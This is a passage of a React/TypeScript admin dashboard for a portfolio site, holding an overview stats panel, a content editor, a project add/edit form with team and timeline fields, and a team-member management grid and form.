          </div>
          <div className="flex items-center gap-4">
            {saveMessage && (
              <span className={`text-sm font-medium ${saveMessage.includes('✅') ? 'text-green-400' : 'text-red-400'}`}>
                {saveMessage}
              </span>
            )}
            <button
              onClick={() => { fetchContent(); fetchProjects(); fetchLiveTraffic(); }}
              className="p-2 rounded-lg bg-white/5 hover:bg-white/10 text-white/40 hover:text-white/70 transition-all"
              title="Refresh"
            >
              <RefreshCw className="w-4 h-4" />
            </button>
          </div>
        </div>

        <div className="p-4 sm:p-8">
          {/* ── OVERVIEW TAB ── */}
          {activeTab === 'overview' && (
            <div className="space-y-8">
              {/* Stats */}
              <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                {[
                  { label: 'Total Projects', value: projects.length, icon: <FolderOpen className="w-5 h-5" />, color: 'from-blue-500/20 to-blue-600/10' },
                  { label: 'Active Visitors', value: trafficData?.activeVisitors || 1, icon: <Users className="w-5 h-5" />, color: 'from-cyan-500/20 to-cyan-600/10' },
                  { label: 'Origin Servers', value: `${trafficData?.serverBreakdown?.length || 1} Sources`, icon: <Server className="w-5 h-5" />, color: 'from-purple-500/20 to-purple-600/10' },
                  { label: 'Cyber Defense', value: (trafficData?.totalThreats || 0) > 0 ? `${trafficData.totalThreats} Blocked` : 'All Secure', icon: <ShieldCheck className="w-5 h-5" />, color: 'from-green-500/20 to-green-600/10' }
                ].map(stat => (
                  <div key={stat.label} className={`bg-gradient-to-br ${stat.color} border border-white/5 rounded-2xl p-6`}>
                    <div className="flex items-center gap-3 mb-3 text-white/40">{stat.icon}<span className="text-xs uppercase tracking-wider">{stat.label}</span></div>
                    <p className="text-3xl font-bold text-white">{stat.value}</p>
                  </div>
                ))}
              </div>

              {/* Quick actions */}
              <div className="bg-white/[0.02] border border-white/5 rounded-2xl p-6">
                <h3 className="text-white font-semibold mb-4">Quick Actions</h3>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                  {[
                    { label: 'Edit Content', tab: 'content' as Tab, icon: <Edit3 className="w-4 h-4" /> },
                    { label: 'Manage Projects', tab: 'projects' as Tab, icon: <FolderOpen className="w-4 h-4" /> },
                    { label: 'Live Security Radar', tab: 'traffic' as Tab, icon: <Radio className="w-4 h-4 text-cyan-400" /> },
                    { label: 'Manage Videos', tab: 'videos' as Tab, icon: <Video className="w-4 h-4" /> },
                  ].map(action => (
                    <button
                      key={action.label}
                      onClick={() => setActiveTab(action.tab)}
                      className="flex items-center gap-3 px-4 py-4 bg-white/5 hover:bg-blue-500/10 border border-white/5 hover:border-blue-500/20 rounded-xl text-white/60 hover:text-cyan-300 transition-all text-sm"
                    >
                      {action.icon}
                      {action.label}
                      <ChevronRight className="w-3 h-3 ml-auto" />
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ── CONTENT EDITOR TAB ── */}
          {activeTab === 'content' && (
            <div className="space-y-8">
              {Object.entries(contentSchema).map(([section, items]) => (
                <div key={section} className="bg-white/[0.02] border border-white/5 rounded-2xl overflow-hidden">
                  <div className="px-6 py-4 border-b border-white/5 bg-white/[0.02]">
                    <h3 className="text-white font-semibold">{sectionLabels[section] || section}</h3>
                    <p className="text-white/30 text-xs mt-1">{items.length} editable fields</p>
                  </div>
                  <div className="p-6 space-y-6">
                    {items.map(item => (
                      <div key={item.key}>
                        {renderFieldEditor(section, item)}
                      </div>
                    ))}
                  </div>
                </div>
              ))}

              {Object.keys(contentSchema).length === 0 && (
                <div className="text-center py-16">
                  <FileText className="w-12 h-12 text-white/10 mx-auto mb-4" />
                  <p className="text-white/30 mb-2">No content found in database</p>
                  <p className="text-white/15 text-sm">Run the seed script to populate initial content</p>
                  <code className="block mt-4 px-4 py-2 bg-white/5 rounded-lg text-cyan-400/60 text-xs">
                    cd backend && node scripts/seedContent.js
                  </code>
                </div>
              )}
            </div>
          )}

          {/* ── PROJECTS TAB ── */}
          {activeTab === 'projects' && (
            <div className="space-y-6">
              {/* Header row */}
              <div className="flex items-center justify-between">
                <p className="text-white/40 text-sm">{projects.length} project{projects.length !== 1 ? 's' : ''}</p>
                <button
                  onClick={openAddProject}
                  className="flex items-center gap-2 px-5 py-2.5 bg-gradient-to-r from-blue-500/20 to-cyan-500/20 text-cyan-300 rounded-xl border border-cyan-500/25 hover:from-blue-500/30 hover:to-cyan-500/30 transition-all text-sm font-semibold"
                >
                  <Plus className="w-4 h-4" />
                  Add New Project
                </button>
              </div>

              {/* ── Project Form (Add / Edit) ── */}
              {showProjectForm && (
                <div className="bg-white/[0.03] border border-white/10 rounded-2xl overflow-hidden shadow-2xl">
                  <div className="px-6 py-4 border-b border-white/5 bg-white/[0.02] flex items-center justify-between">
                    <h3 className="text-white font-semibold flex items-center gap-2">
                      {editingProjectId ? <Edit3 className="w-4 h-4 text-cyan-400" /> : <Plus className="w-4 h-4 text-cyan-400" />}
                      {editingProjectId ? 'Edit Project Data & Architecture' : 'Add New Cosmic Project'}
                    </h3>
                    <button onClick={closeProjectForm} className="p-2 rounded-lg hover:bg-white/10 text-white/30 hover:text-white/60 transition-all">
                      <X className="w-4 h-4" />
                    </button>
                  </div>

                  <div className="p-6 space-y-5">
                    {/* Row 1: Title */}
                    <div className="space-y-1.5">
                      <label className="text-sm text-white/50 font-medium">Title *</label>
                      <input
                        type="text"
                        value={projectForm.title}
                        onChange={e => setProjectForm(p => ({ ...p, title: e.target.value }))}
                        placeholder="e.g. Star AI Assistant"
                        maxLength={100}
                        className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                      />
                    </div>

                    {/* Row 2: Short Description */}
                    <div className="space-y-1.5">
                      <label className="text-sm text-white/50 font-medium">Short Description *</label>
                      <input
                        type="text"
                        value={projectForm.shortDescription}
                        onChange={e => setProjectForm(p => ({ ...p, shortDescription: e.target.value }))}
                        placeholder="Brief one-liner for the project card"
                        maxLength={200}
                        className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                      />
                    </div>

                    {/* Row 3: Full Description */}
                    <div className="space-y-1.5">
                      <label className="text-sm text-white/50 font-medium">Full Description *</label>
                      <textarea
                        value={projectForm.description}
                        onChange={e => setProjectForm(p => ({ ...p, description: e.target.value }))}
                        placeholder="Detailed description of the project..."
                        maxLength={1000}
                        rows={4}
                        className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all resize-none"
                      />
                      <p className="text-white/20 text-xs text-right">{projectForm.description.length}/1000</p>
                    </div>

                    {/* Row 4: Category + Status */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium">Category</label>
                        <select
                          value={projectForm.category}
                          onChange={e => setProjectForm(p => ({ ...p, category: e.target.value }))}
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm focus:border-cyan-400/50 focus:outline-none transition-all appearance-none cursor-pointer"
                        >
                          {CATEGORIES.map(cat => (
                            <option key={cat} value={cat} className="bg-slate-900 text-white">{cat}</option>
                          ))}
                        </select>
                      </div>
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium">Status</label>
                        <select
                          value={projectForm.status}
                          onChange={e => setProjectForm(p => ({ ...p, status: e.target.value }))}
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm focus:border-cyan-400/50 focus:outline-none transition-all appearance-none cursor-pointer"
                        >
                          {STATUSES.map(s => (
                            <option key={s} value={s} className="bg-slate-900 text-white">{s}</option>
                          ))}
                        </select>
                      </div>
                    </div>

                    {/* Row 5: Technologies + Tags */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <Tag className="w-3.5 h-3.5" /> Technologies
                        </label>
                        <input
                          type="text"
                          value={projectForm.technologies}
                          onChange={e => setProjectForm(p => ({ ...p, technologies: e.target.value }))}
                          placeholder="React, Node.js, Python (comma-separated)"
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                        />
                      </div>
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <Tag className="w-3.5 h-3.5" /> Tags
                        </label>
                        <input
                          type="text"
                          value={projectForm.tags}
                          onChange={e => setProjectForm(p => ({ ...p, tags: e.target.value }))}
                          placeholder="ai, machine-learning, web (comma-separated)"
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                        />
                      </div>
                    </div>

                    {/* Row 6: GitHub + Live URL */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <GithubIcon className="w-3.5 h-3.5" /> GitHub URL
                        </label>
                        <input
                          type="url"
                          value={projectForm.githubUrl}
                          onChange={e => setProjectForm(p => ({ ...p, githubUrl: e.target.value }))}
                          placeholder="https://github.com/..."
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                        />
                      </div>
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <Globe className="w-3.5 h-3.5" /> Live URL
                        </label>
                        <input
                          type="url"
                          value={projectForm.liveUrl}
                          onChange={e => setProjectForm(p => ({ ...p, liveUrl: e.target.value }))}
                          placeholder="https://..."
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                        />
                      </div>
                    </div>

                    {/* Row 7: Image Upload + Featured */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <ImageIcon className="w-3.5 h-3.5" /> Project Image
                        </label>
                        <div className="flex items-center gap-3">
                          <label className="flex-1 flex items-center gap-2 px-4 py-3 bg-white/5 border border-white/10 border-dashed rounded-xl text-white/40 text-sm cursor-pointer hover:bg-white/[0.08] hover:border-cyan-500/30 transition-all">
                            <Upload className="w-4 h-4" />
                            <span>{projectForm.image ? projectForm.image.name : 'Choose image...'}</span>
                            <input
                              type="file"
                              accept="image/jpeg,image/png,image/gif,image/webp"
                              onChange={handleImageChange}
                              className="hidden"
                            />
                          </label>
                          {imagePreview && (
                            <img src={imagePreview} alt="Preview" className="w-12 h-12 rounded-lg object-cover border border-white/10" />
                          )}
                        </div>
                      </div>
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <Star className="w-3.5 h-3.5" /> Featured
                        </label>
                        <button
                          type="button"
                          onClick={() => setProjectForm(p => ({ ...p, featured: !p.featured }))}
                          className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl border text-sm font-medium transition-all ${projectForm.featured
                            ? 'bg-purple-500/15 border-purple-500/30 text-purple-300'
                            : 'bg-white/5 border-white/10 text-white/40 hover:bg-white/[0.08]'
                            }`}
                        >
                          <Star className={`w-4 h-4 ${projectForm.featured ? 'fill-purple-400' : ''}`} />
                          {projectForm.featured ? 'Featured — will be pinned at top' : 'Not featured'}
                        </button>
                      </div>
                    </div>

                    {/* Row 8: Start Date + Project Type */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <Calendar className="w-3.5 h-3.5 text-cyan-400" /> Start Date / Initiation *
                        </label>
                        <input
                          type="text"
                          value={projectForm.startDate}
                          onChange={e => setProjectForm(p => ({ ...p, startDate: e.target.value }))}
                          placeholder="e.g. October 2024 or Q3 2024"
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                        />
                      </div>
                      <div className="space-y-1.5">
                        <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                          <Users className="w-3.5 h-3.5 text-purple-400" /> Project Type / Team Format *
                        </label>
                        <select
                          value={projectForm.projectType}
                          onChange={e => setProjectForm(p => ({ ...p, projectType: e.target.value as any }))}
                          className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm focus:border-cyan-400/50 focus:outline-none transition-all appearance-none cursor-pointer"
                        >
                          {PROJECT_TYPES.map(type => (
                            <option key={type} value={type} className="bg-slate-900 text-white">{type}</option>
                          ))}
                        </select>
                      </div>
                    </div>

                    {/* Row 9: Space & AI Tools Used */}
                    <div className="space-y-1.5">
                      <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                        <Sparkles className="w-3.5 h-3.5 text-cyan-400" /> Space & AI Tools Used (Comma-separated)
                      </label>
                      <input
                        type="text"
                        value={projectForm.toolsUsed}
                        onChange={e => setProjectForm(p => ({ ...p, toolsUsed: e.target.value }))}
                        placeholder="e.g. PyTorch, Gemini Flash, Space Canvas Engine, TailwindCSS, Docker"
                        className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all"
                      />
                    </div>

                    {/* Row 10: How It Was Completed (Space / Tech Journey) */}
                    <div className="space-y-1.5">
                      <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                        <Layers className="w-3.5 h-3.5 text-blue-400" /> How It Was Completed (Cosmic Journey & Architecture)
                      </label>
                      <textarea
                        value={projectForm.howCompleted}
                        onChange={e => setProjectForm(p => ({ ...p, howCompleted: e.target.value }))}
                        placeholder="Describe how the project was created: architecture decisions, cosmic/space animation techniques, engineering challenges solved..."
                        rows={4}
                        className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all resize-none"
                      />
                    </div>

                    {/* Row 11: Future Scope & Roadmap */}
                    <div className="space-y-1.5">
                      <label className="text-sm text-white/50 font-medium flex items-center gap-1.5">
                        <Clock className="w-3.5 h-3.5 text-emerald-400" /> Future Scope & Next Milestones (One per line)
                      </label>
                      <textarea
                        value={projectForm.futureScope}
                        onChange={e => setProjectForm(p => ({ ...p, futureScope: e.target.value }))}
                        placeholder="Enter upcoming features or roadmap goals (one per line)..."
                        rows={3}
                        className="w-full px-4 py-3 bg-white/5 border border-white/10 rounded-xl text-white/90 text-sm placeholder:text-white/20 focus:border-cyan-400/50 focus:outline-none transition-all resize-none font-mono text-xs"
                      />
                    </div>

                    {/* Row 12: Team Members / Contributors */}
                    <div className="space-y-3 p-4 bg-white/[0.02] border border-white/5 rounded-xl">
                      <div className="flex items-center justify-between">
                        <label className="text-sm text-white/70 font-semibold flex items-center gap-1.5">
                          <Users className="w-4 h-4 text-cyan-400" /> Team Members & Collaborators ({projectForm.teamMembers.length})
                        </label>
                        <button
                          type="button"
                          onClick={addTeamMember}
                          className="px-3 py-1 bg-cyan-500/15 hover:bg-cyan-500/25 border border-cyan-500/30 rounded-lg text-cyan-300 text-xs font-medium flex items-center gap-1 transition-all"
                        >
                          <UserPlus className="w-3.5 h-3.5" /> Add Member
                        </button>
                      </div>

                      <div className="space-y-2.5">
                        {projectForm.teamMembers.map((member, idx) => (
                          <div key={idx} className="p-3 bg-white/[0.03] border border-white/5 rounded-xl space-y-2">
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-2">
                              <input
                                type="text"
                                value={member.name}
                                onChange={e => updateTeamMember(idx, 'name', e.target.value)}
                                placeholder="Member Name *"
                                className="px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white text-xs placeholder:text-white/20 focus:outline-none focus:border-cyan-400/40"
                              />
                              <input
                                type="text"
                                value={member.role}
                                onChange={e => updateTeamMember(idx, 'role', e.target.value)}
                                placeholder="Role (e.g. Lead AI Engineer)"
                                className="px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white text-xs placeholder:text-white/20 focus:outline-none focus:border-cyan-400/40"
                              />
                              <div className="flex items-center gap-2">
                                <input
                                  type="text"
                                  value={member.contribution}
                                  onChange={e => updateTeamMember(idx, 'contribution', e.target.value)}
                                  placeholder="Specific contribution..."
                                  className="flex-1 px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white text-xs placeholder:text-white/20 focus:outline-none focus:border-cyan-400/40"
                                />
                                {projectForm.teamMembers.length > 1 && (
                                  <button
                                    type="button"
                                    onClick={() => removeTeamMember(idx)}
                                    className="p-2 text-red-400/60 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-colors"
                                  >
                                    <Trash2 className="w-3.5 h-3.5" />
                                  </button>
                                )}
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Row 13: Project Timeline Phases */}
                    <div className="space-y-3 p-4 bg-white/[0.02] border border-white/5 rounded-xl">
                      <div className="flex items-center justify-between">
                        <label className="text-sm text-white/70 font-semibold flex items-center gap-1.5">
                          <Clock className="w-4 h-4 text-purple-400" /> Timeline Phases & Milestones ({projectForm.timelinePhases.length})
                        </label>
                        <button
                          type="button"
                          onClick={addTimelinePhase}
                          className="px-3 py-1 bg-purple-500/15 hover:bg-purple-500/25 border border-purple-500/30 rounded-lg text-purple-300 text-xs font-medium flex items-center gap-1 transition-all"
                        >
                          <Plus className="w-3.5 h-3.5" /> Add Phase
                        </button>
                      </div>

                      <div className="space-y-2.5">
                        {projectForm.timelinePhases.map((phase, idx) => (
                          <div key={idx} className="p-3 bg-white/[0.03] border border-white/5 rounded-xl space-y-2">
                            <div className="grid grid-cols-1 md:grid-cols-4 gap-2">
                              <input
                                type="text"
                                value={phase.phase}
                                onChange={e => updateTimelinePhase(idx, 'phase', e.target.value)}
                                placeholder="Phase (e.g. Phase 1)"
                                className="px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white text-xs placeholder:text-white/20 focus:outline-none focus:border-cyan-400/40"
                              />
                              <input
                                type="text"
                                value={phase.title}
                                onChange={e => updateTimelinePhase(idx, 'title', e.target.value)}
                                placeholder="Phase Title (e.g. Prototype)"
                                className="px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white text-xs placeholder:text-white/20 focus:outline-none focus:border-cyan-400/40"
                              />
                              <input
                                type="text"
                                value={phase.description}
                                onChange={e => updateTimelinePhase(idx, 'description', e.target.value)}
                                placeholder="Phase description..."
                                className="px-3 py-2 bg-white/5 border border-white/10 rounded-lg text-white text-xs placeholder:text-white/20 focus:outline-none focus:border-cyan-400/40"
                              />
                              <div className="flex items-center justify-between gap-2">
                                <label className="flex items-center gap-2 text-xs text-white/70 cursor-pointer select-none">
                                  <input
                                    type="checkbox"
                                    checked={phase.completed}
                                    onChange={e => updateTimelinePhase(idx, 'completed', e.target.checked)}
                                    className="rounded bg-white/10 border-white/20 text-cyan-500 focus:ring-0"
                                  />
                                  <span>{phase.completed ? 'Completed' : 'Planned'}</span>
                                </label>
                                {projectForm.timelinePhases.length > 1 && (
                                  <button
                                    type="button"
                                    onClick={() => removeTimelinePhase(idx)}
                                    className="p-1.5 text-red-400/60 hover:text-red-400 hover:bg-red-500/10 rounded-lg transition-colors"
                                  >
                                    <Trash2 className="w-3.5 h-3.5" />
                                  </button>
                                )}
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>

                    {/* Action buttons */}
                    <div className="flex items-center gap-3 pt-2">
                      <button
                        onClick={saveProject}
                        disabled={projectSaving}
                        className="flex items-center gap-2 px-6 py-3 bg-gradient-to-r from-blue-500/20 to-cyan-500/20 text-cyan-300 rounded-xl border border-cyan-500/25 hover:from-blue-500/30 hover:to-cyan-500/30 transition-all text-sm font-semibold disabled:opacity-50"
                      >
                        {projectSaving ? <Loader2 className="w-4 h-4 animate-spin" /> : <Save className="w-4 h-4" />}
                        {editingProjectId ? 'Update Project' : 'Create Project'}
                      </button>
                      <button
                        onClick={closeProjectForm}
                        className="px-6 py-3 bg-white/5 text-white/40 rounded-xl border border-white/10 hover:bg-white/10 hover:text-white/60 transition-all text-sm"
                      >
                        Cancel
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* ── Project List ── */}
              {projects.length === 0 && !showProjectForm ? (
                <div className="text-center py-16">
                  <FolderOpen className="w-12 h-12 text-white/10 mx-auto mb-4" />
                  <p className="text-white/30 mb-2">No projects yet</p>
                  <p className="text-white/15 text-sm mb-6">Click "Add New Project" to create your first project card</p>
                  <button
                    onClick={openAddProject}
                    className="inline-flex items-center gap-2 px-5 py-2.5 bg-cyan-500/15 text-cyan-300 rounded-xl border border-cyan-500/20 hover:bg-cyan-500/25 transition-all text-sm font-medium"
                  >
                    <Plus className="w-4 h-4" />
                    Add Your First Project
                  </button>
                </div>
              ) : (
                <div className="space-y-3">
                  {projects.map(project => (
                    <div key={project._id} className="flex items-center gap-4 px-6 py-4 bg-white/[0.02] border border-white/5 rounded-xl hover:bg-white/[0.04] transition-all group">
                      {project.imageUrl ? (
                        <img src={`${API_BASE}${project.imageUrl}`} alt={project.title} className="w-14 h-14 rounded-lg object-cover border border-white/5" />
                      ) : (
                        <div className="w-14 h-14 rounded-lg bg-white/[0.03] border border-white/5 flex items-center justify-center">
                          <FolderOpen className="w-6 h-6 text-white/10" />
                        </div>
                      )}
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <h4 className="text-white font-medium truncate">{project.title}</h4>
                          <span className="px-2 py-0.5 rounded-full text-[9px] bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 font-medium">
                            {project.projectType || 'Solo Project'}
                          </span>
                        </div>
                        <p className="text-white/30 text-xs truncate mt-0.5">{project.shortDescription || project.description}</p>
                        <div className="flex items-center gap-2 mt-1.5 flex-wrap">
                          <span className="text-[10px] text-white/25">{project.category}</span>
                          {(project.technologies || []).slice(0, 3).map((tech: string) => (
                            <span key={tech} className="px-1.5 py-0.5 text-[9px] bg-white/5 border border-white/5 rounded text-white/30">{tech}</span>
                          ))}
                          {(project.technologies || []).length > 3 && (
                            <span className="text-[9px] text-white/20">+{project.technologies.length - 3}</span>
                          )}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        {project.featured && (
                          <span className="px-2 py-1 bg-purple-500/20 text-purple-300 text-[10px] rounded-full flex items-center gap-1">
                            <Star className="w-2.5 h-2.5 fill-purple-400" /> Featured
                          </span>
                        )}
                        <span className={`px-2.5 py-1 text-[10px] rounded-full font-medium ${project.status === 'Completed' ? 'bg-green-500/20 text-green-300' :
                          project.status === 'In Progress' ? 'bg-blue-500/20 text-blue-300' :
                            project.status === 'On Hold' ? 'bg-amber-500/20 text-amber-300' :
                              'bg-purple-500/20 text-purple-300'
                          }`}>{project.status}</span>
                        <button
                          onClick={() => openEditProject(project)}
                          className="p-2 rounded-lg hover:bg-blue-500/10 text-white/20 hover:text-cyan-400 transition-all opacity-0 group-hover:opacity-100"
                          title="Edit project"
                        >
                          <Edit3 className="w-4 h-4" />
                        </button>
                        <button
                          onClick={() => deleteProject(project._id)}
                          className="p-2 rounded-lg hover:bg-red-500/10 text-white/20 hover:text-red-400 transition-all opacity-0 group-hover:opacity-100"
                          title="Delete project"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── TEAM & SQUAD TAB ── */}
          {activeTab === 'team' && (
            <div className="space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-white text-lg font-bold">Team & Hackathon Squad</h3>
                  <p className="text-white/40 text-xs">Manage founder details, hackathon candidates (e.g. Suman Rana, Ankan Sen), and lab contributors.</p>
                </div>
                <button
                  onClick={openAddTeamMember}
                  className="flex items-center gap-2 px-4 py-2.5 bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 text-white rounded-xl text-xs font-semibold shadow-lg shadow-blue-500/20 transition-all hover:-translate-y-0.5 active:translate-y-0"
                >
                  <Plus className="w-4 h-4" />
                  Add Team Member
                </button>
              </div>

              {/* Members Grid */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {teamMembers.map(member => (
                  <div
                    key={member.id}
                    className="group relative p-5 rounded-2xl border border-white/5 bg-slate-900/40 hover:bg-slate-900/70 hover:border-cyan-500/30 transition-all duration-300"
                  >
                    <div className="flex items-start justify-between gap-4">
                      <div className="flex items-start gap-3.5">
                        {member.avatarUrl ? (
                          <img
                            src={member.avatarUrl}
                            alt={member.name}
                            className="w-12 h-12 rounded-xl object-cover border border-cyan-500/30 shadow-md"
                            onError={(e) => {
                              e.currentTarget.style.display = 'none';
                              const next = e.currentTarget.nextElementSibling as HTMLElement;
                              if (next) next.style.display = 'flex';
                            }}
                          />
                        ) : null}
                        <div className={`w-12 h-12 rounded-xl bg-gradient-to-tr from-cyan-600 to-blue-500 flex items-center justify-center text-white font-bold text-sm shadow-md ${member.avatarUrl ? 'hidden' : 'flex'}`}>
                          {member.fallbackInitials || member.name.slice(0, 2).toUpperCase()}
                        </div>

                        <div className="min-w-0">
                          <div className="flex items-center gap-2 mb-1">
                            <h4 className="text-white font-bold text-sm truncate">{member.name}</h4>
                            {member.isMainLeader && (
                              <span className="px-1.5 py-0.5 rounded text-[9px] font-mono font-bold bg-amber-400 text-slate-950">
                                FOUNDER
                              </span>
                            )}
                          </div>
                          <p className="text-cyan-300 text-xs font-medium truncate">{member.role}</p>
                          {member.badge && (
                            <span className="inline-block mt-1 px-2 py-0.5 rounded-full text-[10px] font-mono border border-cyan-500/30 text-cyan-200 bg-cyan-950/40">
                              {member.badge}
                            </span>
                          )}
                        </div>
                      </div>

                      <div className="flex items-center gap-1.5 opacity-80 group-hover:opacity-100 transition-opacity">
                        <button
                          onClick={() => openEditTeamMember(member)}
                          className="p-2 rounded-lg bg-white/5 hover:bg-cyan-500/20 text-white/60 hover:text-cyan-300 transition-colors"
                          title="Edit member"
                        >
                          <Edit3 className="w-4 h-4" />
                        </button>
                        {!member.isMainLeader && (
                          <button
                            onClick={() => deleteTeamMember(member.id, member.name)}
                            className="p-2 rounded-lg bg-white/5 hover:bg-red-500/20 text-white/60 hover:text-red-400 transition-colors"
                            title="Delete member"
                          >
                            <Trash2 className="w-4 h-4" />
                          </button>
                        )}
                      </div>
                    </div>

                    {member.bio && (
                      <p className="mt-3 text-xs text-white/50 line-clamp-2 leading-relaxed border-t border-white/5 pt-2.5">
                        {member.bio}
                      </p>
                    )}

                    {/* Social Handles Badges */}
                    <div className="mt-3 pt-2.5 border-t border-white/5 flex flex-wrap items-center gap-2 text-[11px] text-white/40">
                      {member.socials?.portfolio && (
                        <a href={member.socials.portfolio} target="_blank" rel="noopener noreferrer" className="hover:text-cyan-300 flex items-center gap-1">
                          <Globe className="w-3 h-3" /> Website
                        </a>
                      )}
                      {member.socials?.github && (
                        <a href={member.socials.github} target="_blank" rel="noopener noreferrer" className="hover:text-white flex items-center gap-1">
                          <GithubIcon className="w-3 h-3" /> GitHub
                        </a>
                      )}
                      {member.socials?.linkedin && (
                        <a href={member.socials.linkedin} target="_blank" rel="noopener noreferrer" className="hover:text-blue-300 flex items-center gap-1">
                          LinkedIn
                        </a>
                      )}
                      {member.socials?.unstop && (
                        <a href={member.socials.unstop} target="_blank" rel="noopener noreferrer" className="hover:text-cyan-300 text-cyan-400/80 flex items-center gap-1" title="Unstop Profile">
                          <UnstopIcon className="w-3 h-3" /> Unstop
                        </a>
                      )}
                      {member.socials?.email && (
                        <span className="text-white/30 truncate max-w-[140px]">{member.socials.email}</span>
                      )}
                    </div>
                  </div>
                ))}
              </div>

              {/* Team Member Form Modal */}
              {showTeamForm && (
                <div className="fixed inset-0 z-[10000] bg-black/80 backdrop-blur-md flex items-center justify-center p-4">
                  <div className="relative w-full max-w-2xl max-h-[90vh] overflow-y-auto bg-slate-900 border border-white/10 rounded-2xl p-6 text-white shadow-2xl">
                    <div className="flex items-center justify-between pb-4 border-b border-white/10 mb-5">
                      <h3 className="text-base font-bold text-white flex items-center gap-2">
                        <Users className="w-5 h-5 text-cyan-400" />
                        <span>{editingMemberId ? 'Edit Team Member' : 'Add Team Member'}</span>
                      </h3>
                      <button onClick={closeTeamForm} className="p-1 rounded-lg hover:bg-white/10 text-white/40 hover:text-white">
                        <X className="w-5 h-5" />
                      </button>
                    </div>

                    <form onSubmit={saveTeamMember} className="space-y-4 text-xs">
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <div>
                          <label className="block text-white/60 mb-1 font-medium">Full Name *</label>
                          <input
                            type="text"
                            required
                            value={teamForm.name}
                            onChange={e => setTeamForm({ ...teamForm, name: e.target.value })}
                            placeholder="e.g. Suman Rana"
                            className="w-full bg-slate-800 border border-white/10 rounded-xl px-3 py-2 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                        <div>
                          <label className="block text-white/60 mb-1 font-medium">Role / Title *</label>
                          <input
                            type="text"
                            required
                            value={teamForm.role}
                            onChange={e => setTeamForm({ ...teamForm, role: e.target.value })}
                            placeholder="e.g. CareerKick Co-Creator & Full-Stack Web3 Developer"
                            className="w-full bg-slate-800 border border-white/10 rounded-xl px-3 py-2 text-white placeholder-white/20 focus:border-cyan-400 outline-none"
                          />
                        </div>
                      </div>

                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                        <div>
